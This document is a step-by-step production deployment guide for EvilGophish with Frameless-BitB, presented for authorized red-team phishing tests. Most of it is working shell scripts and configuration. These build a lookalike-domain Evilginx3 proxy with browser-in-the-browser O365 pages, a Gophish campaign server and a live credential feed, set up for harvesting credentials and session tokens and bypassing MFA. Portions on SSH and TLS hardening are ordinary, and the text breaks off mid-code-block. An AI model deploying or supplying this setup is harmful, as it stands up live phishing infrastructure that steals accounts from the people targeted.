# EvilGophish + Frameless-BitB Production Deployment Guide

## Comprehensive Setup for Authorized Security Testing

---

## Table of Contents

1. [Prerequisites & Authorization](#1-prerequisites--authorization)
2. [Environment Setup](#2-environment-setup)
3. [EvilGophish Deployment](#3-evilgophish-deployment)
4. [Frameless-BitB Integration](#4-frameless-bitb-integration)
5. [Production Hardening](#5-production-hardening)
6. [Testing & Validation](#6-testing--validation)
7. [Backup & Recovery](#7-backup--recovery)
8. [Troubleshooting](#8-troubleshooting)

---

## 1. Prerequisites & Authorization

### 1.1 Legal Requirements

> **CRITICAL NOTICE**: This infrastructure is designed exclusively for authorized security testing, red team exercises, and penetration testing engagements. Unauthorized use is illegal.

#### Required Documentation Before Deployment

1. **Written Authorization** - Formal signed agreement from asset owner
2. **Scope Definition** - Clear boundaries of testing activities
3. **Rules of Engagement** - Approved methods and limitations
4. **Emergency Contacts** - Points of contact for incident response
5. **Data Handling Agreement** - How captured credentials will be handled

### 1.2 Authorization Template

```
SECURITY TESTING AUTHORIZATION AGREEMENT

Date: ____________________

This document authorizes [TESTER NAME/COMPANY] to conduct phishing simulation
and credential harvesting testing against the following assets:

SCOPE:
- Target Domain(s): _______________________
- Target Users: ___________________________
- Testing Period: From _______ to _________

AUTHORIZED ACTIVITIES:
[ ] Email phishing campaigns
[ ] SMS phishing (smishing)
[ ] Credential harvesting via proxy
[ ] Session token capture
[ ] MFA/2FA bypass testing

RESTRICTIONS:
- No testing outside defined scope
- No data exfiltration beyond test credentials
- All captured data to be securely deleted after: ________

EMERGENCY CONTACTS:
- Primary: _________________ Phone: _____________
- Secondary: _______________ Phone: _____________

AUTHORIZED BY:
Name: _____________________
Title: ____________________
Organization: _____________
Signature: ________________
Date: ____________________

TESTER ACKNOWLEDGMENT:
I agree to conduct testing within the scope defined above and comply with
all applicable laws and regulations.

Name: _____________________
Signature: ________________
Date: ____________________
```

### 1.3 Infrastructure Requirements

#### Domain Requirements

| Component | Requirement | Example |
|-----------|-------------|---------|
| Primary Phishing Domain | Registered domain with DNS control | `secure-login.com` |
| Subdomains | Multiple subdomains for phishlets | `accounts.secure-login.com` |
| Redirect Domain | Clean domain for post-capture redirect | `company-portal.com` |

#### DNS Records Required

```
# A Records (pointing to your server IP)
@           A       YOUR_SERVER_IP
accounts    A       YOUR_SERVER_IP
login       A       YOUR_SERVER_IP
auth        A       YOUR_SERVER_IP

# NS Records (for evilginx3 DNS takeover)
@           NS      ns1.secure-login.com.
ns1         A       YOUR_SERVER_IP
```

#### SSL/TLS Certificates

- **Method 1**: Let's Encrypt (automated via certbot) - Recommended
- **Method 2**: Evilginx3 auto-generation (ACME)
- **Method 3**: Commercial certificates (for stealth)

#### Server Specifications

| Specification | Minimum | Recommended |
|--------------|---------|-------------|
| CPU | 2 cores | 4+ cores |
| RAM | 2 GB | 4+ GB |
| Storage | 20 GB SSD | 50+ GB SSD |
| Network | 100 Mbps | 1 Gbps |
| OS | Ubuntu 20.04 LTS | Ubuntu 22.04 LTS |
| IP | Static IPv4 | Static IPv4 + IPv6 |

### 1.4 Network Architecture

```
                    INTERNET
                        │
                        ▼
              ┌─────────────────┐
              │   Firewall      │
              │  (UFW/iptables) │
              └────────┬────────┘
                       │
         ┌─────────────┼─────────────┐
         │             │             │
    ┌────▼────┐   ┌────▼────┐   ┌────▼────┐
    │ Port 80 │   │Port 443 │   │ Port 53 │
    │  HTTP   │   │  HTTPS  │   │   DNS   │
    └────┬────┘   └────┬────┘   └────┬────┘
         │             │             │
         └─────────────┼─────────────┘
                       │
              ┌────────▼────────┐
              │   Apache 2.4    │
              │ (Reverse Proxy) │
              │   + BitB Subs   │
              └────────┬────────┘
                       │
              ┌────────▼────────┐
              │   Evilginx3     │
              │  (Port 8443)    │
              │   MITM Proxy    │
              └────────┬────────┘
                       │
              ┌────────▼────────┐
              │    Gophish      │
              │  Admin: 3333    │
              │  Campaign Mgmt  │
              └────────┬────────┘
                       │
              ┌────────▼────────┐
              │    Evilfeed     │
              │  (Port 1337)    │
              │   Live Feed     │
              └─────────────────┘
```

---

## 2. Environment Setup

### 2.1 Operating System Requirements

#### Supported Operating Systems
- Ubuntu 20.04 LTS (Focal Fossa)
- Ubuntu 22.04 LTS (Jammy Jellyfish) - **Recommended**

#### Initial System Update

```bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Set timezone
sudo timedatectl set-timezone UTC

# Install basic utilities
sudo apt install -y curl wget git vim htop unzip software-properties-common

# Verify system
cat /etc/os-release
uname -a
```

**Expected Output:**
```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
```

### 2.2 Dependency Installation

#### Core Dependencies Script

Save as `scripts/install-dependencies.sh`:

```bash
#!/bin/bash
#
# EvilGophish + Frameless-BitB Dependencies Installation
# For Ubuntu 20.04/22.04 LTS
#

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   log_error "This script must be run as root"
   exit 1
fi

log_info "Starting dependency installation..."

# Update package lists
log_info "Updating package lists..."
apt update

# Build tools
log_info "Installing build-essential..."
apt install -y build-essential
gcc --version

# Git
log_info "Installing git..."
apt install -y git
git --version

# Network tools
log_info "Installing network tools..."
apt install -y net-tools dnsutils curl wget

# Security tools
log_info "Installing security tools..."
apt install -y openssl certbot

# Web server
log_info "Installing Apache2..."
apt install -y apache2 apache2-utils

# Database tools
log_info "Installing SQLite..."
apt install -y sqlite3 libsqlite3-dev

# Process management
log_info "Installing tmux and supervisor..."
apt install -y tmux supervisor

# JSON processing
log_info "Installing jq..."
apt install -y jq

# Go language installation
log_info "Installing Go language..."
GO_VERSION=$(curl -s https://go.dev/VERSION?m=text | head -1)
log_info "Latest Go version: $GO_VERSION"

if [[ -d /usr/local/go ]]; then
    log_warn "Existing Go installation found, backing up..."
    mv /usr/local/go /usr/local/go.bak.$(date +%s)
fi

wget -q "https://go.dev/dl/${GO_VERSION}.linux-amd64.tar.gz" -O /tmp/go.tar.gz
tar -C /usr/local -xzf /tmp/go.tar.gz
rm /tmp/go.tar.gz

# Set up Go environment
cat >> /etc/profile.d/go.sh << 'EOF'
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
EOF

source /etc/profile.d/go.sh
ln -sf /usr/local/go/bin/go /usr/bin/go

go version

# Python (for auxiliary scripts)
log_info "Installing Python3..."
apt install -y python3 python3-pip python3-venv

# Firewall
log_info "Installing UFW..."
apt install -y ufw

# Clean up
log_info "Cleaning up..."
apt autoremove -y
apt clean

log_info "Dependency installation complete!"
log_info "Please log out and back in, or run: source /etc/profile.d/go.sh"

# Verify installations
echo ""
echo "=== Installation Verification ==="
echo "Go version: $(go version)"
echo "Git version: $(git --version)"
echo "Apache version: $(apache2 -v | head -1)"
echo "SQLite version: $(sqlite3 --version)"
echo "OpenSSL version: $(openssl version)"
echo "================================="
```

#### Apache Module Installation

```bash
# Enable required Apache modules
sudo a2enmod proxy
sudo a2enmod proxy_http
sudo a2enmod ssl
sudo a2enmod substitute
sudo a2enmod rewrite
sudo a2enmod headers
sudo a2enmod env
sudo a2enmod proxy_wstunnel

# Verify enabled modules
apache2ctl -M | grep -E "proxy|ssl|substitute|rewrite|headers"

# Expected output:
# headers_module (shared)
# proxy_module (shared)
# proxy_http_module (shared)
# rewrite_module (shared)
# ssl_module (shared)
# substitute_module (shared)
```

### 2.3 Firewall Configuration

#### UFW Setup Script

```bash
#!/bin/bash
#
# Firewall Configuration for EvilGophish + Frameless-BitB
#

# Reset UFW
sudo ufw --force reset

# Default policies
sudo ufw default deny incoming
sudo ufw default allow outgoing

# SSH (change port if using non-standard)
sudo ufw allow 22/tcp comment 'SSH'

# DNS (for evilginx3)
sudo ufw allow 53/tcp comment 'DNS TCP'
sudo ufw allow 53/udp comment 'DNS UDP'

# HTTP/HTTPS (for Apache/phishing)
sudo ufw allow 80/tcp comment 'HTTP'
sudo ufw allow 443/tcp comment 'HTTPS'

# Enable UFW
sudo ufw --force enable

# Show status
sudo ufw status verbose
```

**Expected Output:**
```
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW IN    Anywhere                   # SSH
53/tcp                     ALLOW IN    Anywhere                   # DNS TCP
53/udp                     ALLOW IN    Anywhere                   # DNS UDP
80/tcp                     ALLOW IN    Anywhere                   # HTTP
443/tcp                    ALLOW IN    Anywhere                   # HTTPS
```

### 2.4 Security Hardening

#### SSH Hardening

```bash
# Backup SSH config
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# Apply hardening
sudo tee -a /etc/ssh/sshd_config.d/hardening.conf << 'EOF'
# Disable root login
PermitRootLogin no

# Use SSH key authentication only
PasswordAuthentication no
PubkeyAuthentication yes

# Disable empty passwords
PermitEmptyPasswords no

# Limit authentication attempts
MaxAuthTries 3

# Set idle timeout
ClientAliveInterval 300
ClientAliveCountMax 2

# Disable X11 forwarding
X11Forwarding no

# Disable TCP forwarding
AllowTcpForwarding no
EOF

# Restart SSH
sudo systemctl restart sshd

# Verify configuration
sudo sshd -t
```

#### System Hardening

```bash
# Disable unnecessary services
sudo systemctl disable cups
sudo systemctl disable avahi-daemon

# Set proper permissions on sensitive files
sudo chmod 700 /root
sudo chmod 600 /etc/shadow

# Enable automatic security updates
sudo apt install -y unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades

# Configure sysctl for security
sudo tee /etc/sysctl.d/99-security.conf << 'EOF'
# IP Spoofing protection
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignore ICMP broadcast requests
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Disable source packet routing
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0

# Ignore send redirects
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

# Block SYN attacks
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syn_retries = 5

# Log Martians
net.ipv4.conf.all.log_martians = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
EOF

sudo sysctl -p /etc/sysctl.d/99-security.conf
```

---

## 3. EvilGophish Deployment

### 3.1 Repository Setup

```bash
# Create installation directory
sudo mkdir -p /opt/evilgophish
sudo chown $USER:$USER /opt/evilgophish
cd /opt/evilgophish

# Clone EvilGophish repository
git clone https://github.com/theroseinc/evilgophish.git .

# Verify clone
ls -la
```

**Expected Output:**
```
total 52
drwxr-xr-x 8 user user 4096 ... .
drwxr-xr-x 3 root root 4096 ... ..
drwxr-xr-x 8 user user 4096 ... .git
-rw-r--r-- 1 user user 3584 ... CHANGELOG.md
-rw-r--r-- 1 user user 11357 ... LICENSE
-rw-r--r-- 1 user user 15324 ... README.md
drwxr-xr-x 4 user user 4096 ... diagram
drwxr-xr-x 2 user user 4096 ... evilginx3
drwxr-xr-x 2 user user 4096 ... gophish
drwxr-xr-x 2 user user 4096 ... evilfeed
-rwxr-xr-x 1 user user 4521 ... setup.sh
-rwxr-xr-x 1 user user 1234 ... replace_rid.sh
```

### 3.2 Configuration Planning

Before running setup, plan your configuration:

| Parameter | Description | Example Value |
|-----------|-------------|---------------|
| `root_domain` | Primary phishing domain | `secure-login.com` |
| `subdomains` | Subdomains to proxy | `"accounts login auth"` |
| `root_domain_bool` | Proxy root domain? | `false` |
| `feed_bool` | Enable live feed? | `true` |
| `rid_replacement` | Custom tracking parameter | `session_id` |

### 3.3 Automated Setup

```bash
# Run the setup script
cd /opt/evilgophish
sudo ./setup.sh secure-login.com "accounts login auth" false true session_id
```

#### Manual Setup (Alternative)

If you prefer manual control, follow these steps:

```bash
# Step 1: Configure DNS for evilginx3 takeover
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Backup DNS configuration
sudo cp /etc/resolv.conf /etc/resolv.conf.bak
sudo cp /etc/hosts /etc/hosts.bak

# Configure local DNS
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
echo "127.0.0.1 accounts.secure-login.com" | sudo tee -a /etc/hosts
echo "127.0.0.1 login.secure-login.com" | sudo tee -a /etc/hosts
echo "127.0.0.1 auth.secure-login.com" | sudo tee -a /etc/hosts

# Step 2: Build Evilginx3
cd /opt/evilgophish/evilginx3
go build -o evilginx3

# Verify build
./evilginx3 -h

# Step 3: Configure and build Gophish
cd /opt/evilgophish/gophish

# Update config.json
cat > config.json << 'EOF'
{
    "admin_server": {
        "listen_url": "127.0.0.1:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "127.0.0.1:8080",
        "use_tls": true,
        "cert_path": "gophish_template.crt",
        "key_path": "gophish_template.key"
    },
    "feed_enabled": true,
    "db_name": "sqlite3",
    "db_path": "gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "",
    "logging": {
        "filename": "gophish.log",
        "level": "info"
    }
}
EOF

# Build Gophish
go build

# Step 4: Build Evilfeed
cd /opt/evilgophish/evilfeed
go build -o evilfeed
```

### 3.4 Database Initialization

```bash
# Gophish creates the database on first run
cd /opt/evilgophish/gophish

# Start Gophish to initialize database
./gophish &
sleep 5

# Stop Gophish
pkill gophish

# Verify database creation
ls -la gophish.db
sqlite3 gophish.db ".tables"
```

**Expected Output:**
```
attachments        group_targets      results            targets
campaigns          groups             smtp               templates
events             maillogs           sms                users
```

### 3.5 Initial Credential Setup

On first run, Gophish generates a temporary admin password:

```bash
# Start Gophish and capture initial password
cd /opt/evilgophish/gophish
./gophish 2>&1 | tee /tmp/gophish_init.log &
sleep 5

# Extract initial password
grep "temporary password" /tmp/gophish_init.log

# Output example:
# time="2024-01-15T10:30:00Z" level=info msg="Please login with the username admin and the password abc123xyz"

# Stop Gophish
pkill gophish
```

### 3.6 Verification Checklist

```bash
#!/bin/bash
# verification-evilgophish.sh

echo "=== EvilGophish Installation Verification ==="

# Check binaries exist
echo -n "Evilginx3 binary: "
[[ -x /opt/evilgophish/evilginx3/evilginx3 ]] && echo "OK" || echo "MISSING"

echo -n "Gophish binary: "
[[ -x /opt/evilgophish/gophish/gophish ]] && echo "OK" || echo "MISSING"

echo -n "Evilfeed binary: "
[[ -x /opt/evilgophish/evilfeed/evilfeed ]] && echo "OK" || echo "MISSING"

# Check database
echo -n "Gophish database: "
[[ -f /opt/evilgophish/gophish/gophish.db ]] && echo "OK" || echo "MISSING"

# Check phishlets
echo -n "Phishlets directory: "
[[ -d /opt/evilgophish/evilginx3/legacy_phishlets ]] && echo "OK" || echo "MISSING"

# Check config
echo -n "Gophish config: "
[[ -f /opt/evilgophish/gophish/config.json ]] && echo "OK" || echo "MISSING"

echo "============================================="
```

---

## 4. Frameless-BitB Integration

### 4.1 Repository Setup

```bash
# Clone Frameless-BitB repository
cd /opt
sudo mkdir -p frameless-bitb
sudo chown $USER:$USER frameless-bitb
git clone https://github.com/theroseinc/frameless-bitb.git frameless-bitb

# Verify clone
ls -la frameless-bitb/
```

**Expected Output:**
```
total 40
drwxr-xr-x 6 user user 4096 ... .
drwxr-xr-x 4 root root 4096 ... ..
drwxr-xr-x 2 user user 4096 ... apache-configs
drwxr-xr-x 2 user user 4096 ... custom-subs
drwxr-xr-x 4 user user 4096 ... pages
-rw-r--r-- 1 user user 2048 ... O365.yaml
-rw-r--r-- 1 user user 1024 ... openssl-local.cnf
-rw-r--r-- 1 user user 8192 ... README.md
```

### 4.2 SSL Certificate Generation

```bash
# Navigate to Frameless-BitB directory
cd /opt/frameless-bitb

# Create certificate directory
sudo mkdir -p /etc/apache2/ssl

# Generate self-signed certificates for development
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/apache2/ssl/bitb.key \
    -out /etc/apache2/ssl/bitb.crt \
    -config openssl-local.cnf

# Set proper permissions
sudo chmod 600 /etc/apache2/ssl/bitb.key
sudo chmod 644 /etc/apache2/ssl/bitb.crt

# Verify certificates
openssl x509 -in /etc/apache2/ssl/bitb.crt -text -noout | head -20
```

### 4.3 Custom Substitution Files

```bash
# Copy custom substitution files
sudo mkdir -p /etc/apache2/custom-subs
sudo cp /opt/frameless-bitb/custom-subs/* /etc/apache2/custom-subs/

# List installed files
ls -la /etc/apache2/custom-subs/
```

### 4.4 Apache Configuration

#### Domain Customization

Before applying the Apache configuration, customize the domain settings:

```bash
# Replace fake.com with your domain
cd /opt/frameless-bitb

# Update all configuration files
find . -type f \( -name "*.conf" -o -name "*.html" -o -name "*.js" \) \
    -exec sed -i 's/fake\.com/secure-login.com/g' {} \;

# Verify replacement
grep -r "secure-login.com" .
```

#### Install Apache Configuration

```bash
# Choose your configuration (Windows or Mac Chrome)
# For Windows Chrome targeting:
sudo cp /opt/frameless-bitb/apache-configs/win-chrome-bitb.conf \
    /etc/apache2/sites-available/bitb.conf

# OR for macOS Chrome targeting:
# sudo cp /opt/frameless-bitb/apache-configs/mac-chrome-bitb.conf \
#     /etc/apache2/sites-available/bitb.conf

# Edit configuration for your setup
sudo nano /etc/apache2/sites-available/bitb.conf
```

#### Example Apache Configuration

```apache
<VirtualHost *:443>
    ServerName accounts.secure-login.com
    ServerAlias login.secure-login.com auth.secure-login.com

    # SSL Configuration
    SSLEngine on
    SSLCertificateFile /etc/apache2/ssl/bitb.crt
    SSLCertificateKeyFile /etc/apache2/ssl/bitb.key

    # Proxy to Evilginx3
    ProxyPreserveHost On
    ProxyPass / https://127.0.0.1:8443/
    ProxyPassReverse / https://127.0.0.1:8443/

    # SSL Proxy settings
    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

    # Include BitB substitution rules
    Include /etc/apache2/custom-subs/bitb-substitutions.conf

    # Logging
    ErrorLog ${APACHE_LOG_DIR}/bitb-error.log
    CustomLog ${APACHE_LOG_DIR}/bitb-access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName accounts.secure-login.com
    ServerAlias login.secure-login.com auth.secure-login.com

    # Redirect to HTTPS
    Redirect permanent / https://accounts.secure-login.com/
</VirtualHost>
```

### 4.5 BitB Page Setup

```bash
# Create web root for BitB pages
sudo mkdir -p /var/www/bitb/{home,primary,secondary}

# Copy page content
sudo cp -r /opt/frameless-bitb/pages/home/* /var/www/bitb/home/
sudo cp -r /opt/frameless-bitb/pages/primary/* /var/www/bitb/primary/
sudo cp -r /opt/frameless-bitb/pages/secondary/* /var/www/bitb/secondary/

# Set permissions
sudo chown -R www-data:www-data /var/www/bitb
sudo chmod -R 755 /var/www/bitb

# Verify structure
tree /var/www/bitb/
```

### 4.6 Enable Site and Test

```bash
# Disable default site
sudo a2dissite 000-default

# Enable BitB site
sudo a2ensite bitb

# Test Apache configuration
sudo apache2ctl configtest

# Expected output:
# Syntax OK

# Restart Apache
sudo systemctl restart apache2

# Check status
sudo systemctl status apache2
```

### 4.7 Phishlet Configuration

Copy the O365 phishlet for use with evilginx3:

```bash
# Copy O365 phishlet
sudo cp /opt/frameless-bitb/O365.yaml /opt/evilgophish/evilginx3/phishlets/

# Or use legacy phishlets
ls /opt/evilgophish/evilginx3/legacy_phishlets/
```

### 4.8 Integration Verification

```bash
#!/bin/bash
# verification-bitb.sh

echo "=== Frameless-BitB Integration Verification ==="

# Check Apache configuration
echo -n "Apache configuration: "
apache2ctl configtest 2>&1 | grep -q "Syntax OK" && echo "OK" || echo "ERROR"

# Check SSL certificates
echo -n "SSL certificates: "
[[ -f /etc/apache2/ssl/bitb.crt ]] && echo "OK" || echo "MISSING"

# Check custom substitutions
echo -n "Custom substitutions: "
[[ -d /etc/apache2/custom-subs ]] && echo "OK" || echo "MISSING"

# Check page directories
echo -n "BitB pages: "
[[ -d /var/www/bitb/primary ]] && echo "OK" || echo "MISSING"

# Check Apache service
echo -n "Apache service: "
systemctl is-active --quiet apache2 && echo "RUNNING" || echo "STOPPED"

echo "================================================"
```

---

## 5. Production Hardening

### 5.1 SSL/TLS Configuration

#### Let's Encrypt Certificates

```bash
# Install certbot for Apache
sudo apt install -y certbot python3-certbot-apache

# Obtain certificates (ensure DNS is pointing to server)
sudo certbot --apache -d accounts.secure-login.com \
    -d login.secure-login.com \
    -d auth.secure-login.com \
    --non-interactive --agree-tos \
    --email admin@example.com

# Setup auto-renewal
sudo systemctl enable certbot.timer
sudo systemctl start certbot.timer

# Test renewal
sudo certbot renew --dry-run
```

#### Strong SSL Configuration

Create `/etc/apache2/conf-available/ssl-hardening.conf`:

```apache
# Modern SSL configuration
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
SSLHonorCipherOrder off
SSLSessionTickets off

# OCSP Stapling
SSLUseStapling on
SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"

# Security Headers
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "SAMEORIGIN"
```

Enable the configuration:

```bash
sudo a2enconf ssl-hardening
sudo systemctl reload apache2
```

### 5.2 Nginx Reverse Proxy (Alternative)

For more advanced deployments, use Nginx as the front-end proxy:

Create `/etc/nginx/sites-available/evilgophish`:

```nginx
# Upstream definitions
upstream evilginx {
    server 127.0.0.1:8443;
    keepalive 32;
}

upstream gophish_admin {
    server 127.0.0.1:3333;
}

upstream evilfeed {
    server 127.0.0.1:1337;
}

# HTTPS server for phishing
server {
    listen 443 ssl http2;
    server_name accounts.secure-login.com login.secure-login.com auth.secure-login.com;

    # SSL certificates
    ssl_certificate /etc/letsencrypt/live/secure-login.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/secure-login.com/privkey.pem;

    # Strong SSL
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # Security headers
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
    add_header X-Content-Type-Options "nosniff" always;

    # Proxy to Evilginx
    location / {
        proxy_pass https://evilginx;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # WebSocket support
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }

    # Logging
    access_log /var/log/nginx/evilgophish-access.log;
    error_log /var/log/nginx/evilgophish-error.log;
}

# Admin interface (internal only)
server {
    listen 127.0.0.1:8443 ssl;
    server_name localhost;

    ssl_certificate /etc/letsencrypt/live/secure-login.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/secure-login.com/privkey.pem;

    location / {
        proxy_pass https://gophish_admin;
        proxy_ssl_verify off;
    }
}

# HTTP redirect
server {
    listen 80;
    server_name accounts.secure-login.com login.secure-login.com auth.secure-login.com;
    return 301 https://$host$request_uri;
}
```

### 5.3 Systemd Services

#### Gophish Service

Create `/etc/systemd/system/gophish.service`:

```ini
[Unit]
Description=Gophish Phishing Framework
Documentation=https://github.com/theroseinc/evilgophish
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=gophish
Group=gophish
WorkingDirectory=/opt/evilgophish/gophish
ExecStart=/opt/evilgophish/gophish/gophish
Restart=always
RestartSec=5
StandardOutput=append:/var/log/gophish/gophish.log
StandardError=append:/var/log/gophish/gophish-error.log

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/opt/evilgophish/gophish

[Install]
WantedBy=multi-user.target
```

#### Evilginx3 Service

Create `/etc/systemd/system/evilginx3.service`:

```ini
[Unit]
Description=Evilginx3 MITM Proxy
Documentation=https://github.com/theroseinc/evilgophish
After=network.target gophish.service
Wants=network-online.target
Requires=gophish.service

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/evilgophish/evilginx3
ExecStart=/opt/evilgophish/evilginx3/evilginx3 -feed -g /opt/evilgophish/gophish/gophish.db
Restart=always
RestartSec=5
StandardOutput=append:/var/log/evilginx3/evilginx3.log
StandardError=append:/var/log/evilginx3/evilginx3-error.log

# Note: Evilginx requires root for port 53/443 binding
# Alternative: Use capabilities
# CapabilityBoundingSet=CAP_NET_BIND_SERVICE
# AmbientCapabilities=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
```

#### Evilfeed Service

Create `/etc/systemd/system/evilfeed.service`:

```ini
[Unit]
Description=Evilfeed Live Event Dashboard
Documentation=https://github.com/theroseinc/evilgophish
After=network.target gophish.service
Wants=network-online.target

[Service]
Type=simple
User=evilfeed
Group=evilfeed
WorkingDirectory=/opt/evilgophish/evilfeed
ExecStart=/opt/evilgophish/evilfeed/evilfeed
Restart=always
RestartSec=5
StandardOutput=append:/var/log/evilfeed/evilfeed.log
StandardError=append:/var/log/evilfeed/evilfeed-error.log

# Security hardening
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

#### Service Setup

```bash
# Create service users
sudo useradd -r -s /bin/false gophish
sudo useradd -r -s /bin/false evilfeed

# Create log directories
sudo mkdir -p /var/log/{gophish,evilginx3,evilfeed}
sudo chown gophish:gophish /var/log/gophish
sudo chown root:root /var/log/evilginx3
sudo chown evilfeed:evilfeed /var/log/evilfeed

# Set permissions on installation
sudo chown -R gophish:gophish /opt/evilgophish/gophish
sudo chown -R root:root /opt/evilgophish/evilginx3
sudo chown -R evilfeed:evilfeed /opt/evilgophish/evilfeed

# Reload systemd
sudo systemctl daemon-reload

# Enable services
sudo systemctl enable gophish evilginx3 evilfeed

# Start services
sudo systemctl start gophish
sleep 3
sudo systemctl start evilginx3
sudo systemctl start evilfeed

# Check status
sudo systemctl status gophish evilginx3 evilfeed
```

### 5.4 Logging Configuration

#### Log Rotation

Create `/etc/logrotate.d/evilgophish`:

```
/var/log/gophish/*.log
/var/log/evilginx3/*.log
/var/log/evilfeed/*.log
{
    daily
    rotate 14
    compress
    delaycompress
    missingok
    notifempty
    create 0640 root adm
    sharedscripts
    postrotate
        systemctl reload gophish evilginx3 evilfeed > /dev/null 2>&1 || true
    endscript
}
```

#### Centralized Logging (Optional)

For rsyslog to forward logs:

```bash
# /etc/rsyslog.d/evilgophish.conf
if $programname == 'gophish' then /var/log/gophish/gophish.log
if $programname == 'evilginx3' then /var/log/evilginx3/evilginx3.log
if $programname == 'evilfeed' then /var/log/evilfeed/evilfeed.log
```

### 5.5 Monitoring Setup

#### Basic Monitoring Script

```bash
#!/bin/bash
# monitor-services.sh

echo "=== EvilGophish Service Monitor ==="
echo "Date: $(date)"
echo ""

# Check services
for service in gophish evilginx3 evilfeed apache2; do
    status=$(systemctl is-active $service)
    if [ "$status" == "active" ]; then
        echo "[OK] $service is running"
    else
        echo "[FAIL] $service is $status"
    fi
done

echo ""
echo "=== Port Check ==="
for port in 53 80 443 3333 8443 1337; do
    if netstat -tuln | grep -q ":$port "; then
        echo "[OK] Port $port is listening"
    else
        echo "[WARN] Port $port is not listening"
    fi
done

echo ""
echo "=== Resource Usage ==="
echo "CPU: $(top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4}')%"
echo "Memory: $(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2}')"
echo "Disk: $(df -h / | awk 'NR==2{print $5}')"
```

---

## 6. Testing & Validation

### 6.1 Pre-flight Checklist

```bash
#!/bin/bash
# preflight-check.sh

echo "=== Pre-flight Checklist ==="
echo ""

# 1. DNS Resolution
echo "1. Testing DNS Resolution..."
for domain in accounts.secure-login.com login.secure-login.com; do
    ip=$(dig +short $domain)
    if [ -n "$ip" ]; then
        echo "   [OK] $domain -> $ip"
    else
        echo "   [FAIL] $domain not resolving"
    fi
done

# 2. Port accessibility
echo ""
echo "2. Testing Port Accessibility..."
for port in 53 80 443; do
    if nc -z -w5 127.0.0.1 $port; then
        echo "   [OK] Port $port accessible"
    else
        echo "   [FAIL] Port $port not accessible"
    fi
done

# 3. Service health
echo ""
echo "3. Testing Service Health..."
for service in gophish evilginx3 evilfeed apache2; do
    if systemctl is-active --quiet $service; then
        echo "   [OK] $service running"
    else
        echo "   [FAIL] $service not running"
    fi
done

# 4. SSL Certificate validity
echo ""
echo "4. Testing SSL Certificates..."
if openssl s_client -connect accounts.secure-login.com:443 -servername accounts.secure-login.com </dev/null 2>/dev/null | openssl x509 -noout -dates 2>/dev/null; then
    echo "   [OK] SSL certificate valid"
else
    echo "   [WARN] SSL certificate check failed"
fi

# 5. Database connectivity
echo ""
echo "5. Testing Database..."
if sqlite3 /opt/evilgophish/gophish/gophish.db "SELECT COUNT(*) FROM users;" >/dev/null 2>&1; then
    echo "   [OK] Database accessible"
else
    echo "   [FAIL] Database not accessible"
fi

echo ""
echo "=== Pre-flight Check Complete ==="
```

### 6.2 End-to-End Testing

#### Step 1: Gophish Admin Access

```bash
# Test admin interface
curl -k -I https://127.0.0.1:3333/login

# Expected:
# HTTP/2 200
# Content-Type: text/html
```

Access via SSH tunnel:
```bash
